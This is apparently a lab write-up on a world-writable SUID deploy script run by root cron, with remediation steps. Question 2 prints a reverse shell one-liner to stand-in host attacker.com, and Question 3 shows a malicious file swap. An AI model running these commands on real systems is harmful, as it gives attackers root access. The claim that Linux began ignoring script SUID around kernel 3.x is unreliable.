# SUID Misconfiguration Analysis

**File:** `/opt/kijanikiosk/scripts/deploy.sh`  
**Before:** `-rwsrwxrwx` (mode 4777, SUID + world-writable)  
**After:** `-rwxr-x---` (mode 0750, root:root)

---

## Question 1: Why does the Linux kernel ignore SUID on interpreted scripts?

When the kernel executes a file, it reads the first bytes to determine the
execution method. For ELF binaries (compiled executables), the kernel loads and
runs the binary directly — the SUID bit causes the effective UID to be set to
the file owner's UID before execution begins.

For interpreted scripts (files beginning with `#!`), the kernel does not execute
the file directly. It reads the interpreter path from the shebang line
(`#!/bin/bash`), then executes the **interpreter** with the script as an
argument. The SUID bit is on the script file, but the kernel is actually
executing `/bin/bash` — a different file. The SUID bit on the script has no
effect on the interpreter's UID.

This behaviour was made intentional around kernel version 3.x as a security
measure. A race condition (TOCTOU — time of check to time of use) exists between
the kernel reading the shebang and executing the interpreter, during which a
symlink swap could redirect execution. By ignoring SUID on scripts, the kernel
eliminates this class of privilege escalation.

---

## Question 2: If SUID has no effect on this script, why is SUID + world-write still a critical finding?

The script is executed by a **root-owned cron job**. The execution path is:

```
cron (running as root) → executes deploy.sh → deploy.sh runs as root
```

The cron job runs `deploy.sh` as root regardless of the SUID bit. This means
the relevant privilege is not the SUID bit — it is the cron job's execution
context. The SUID bit is a red herring. The actual vulnerability is:

**World-write (`o+w`) on a file executed by root.**

Any user on the system can write to `deploy.sh`. They can replace its contents
with arbitrary commands. The next time cron triggers, root executes those
arbitrary commands. This is a direct, reliable path to full system compromise:

```bash
# Attacker writes a reverse shell to deploy.sh:
echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" > /opt/kijanikiosk/scripts/deploy.sh
# Next cron execution: root connects back to attacker
```

The SUID bit adds confusion but not capability. The world-write bit is the
exploitable condition.

---

## Question 3: What would make this scenario exploitable in practice?

Three conditions must be true simultaneously:

1. **A cron job or other privileged process executes the script.** Confirmed —
   the lab setup states a root-owned cron job runs `deploy.sh`. Without this,
   world-write on a script is a permissions problem but not a privilege
   escalation.

2. **An unprivileged user has write access to the file or its parent directory.**
   Confirmed — mode `4777` grants world-write. Even without write on the file,
   write access to the parent directory (`scripts/`) would allow replacing the
   file via `mv` (delete and recreate).

3. **The attacker can wait for or trigger the cron execution.** Standard cron
   jobs run on a schedule — the attacker writes their payload and waits. On a
   busy system, a deployment cron may run frequently.

**Why the parent directory matters:** Even if `deploy.sh` were fixed to `644`
(world-read, no write), if `scripts/` is world-writable, an attacker can:
```bash
mv /opt/kijanikiosk/scripts/deploy.sh /opt/kijanikiosk/scripts/deploy.sh.bak
cp /tmp/malicious.sh /opt/kijanikiosk/scripts/deploy.sh
```
This is why the remediation sets both the file (`750`) and verifies the parent
directory is not world-writable.

---

## Remediation Applied

```bash
sudo chmod u-s /opt/kijanikiosk/scripts/deploy.sh   # remove SUID
sudo chmod 750 /opt/kijanikiosk/scripts/deploy.sh   # remove world permissions
sudo chown root:root /opt/kijanikiosk/scripts/deploy.sh
```

SUID scan result: empty — no other SUID files in `/opt/kijanikiosk/`.
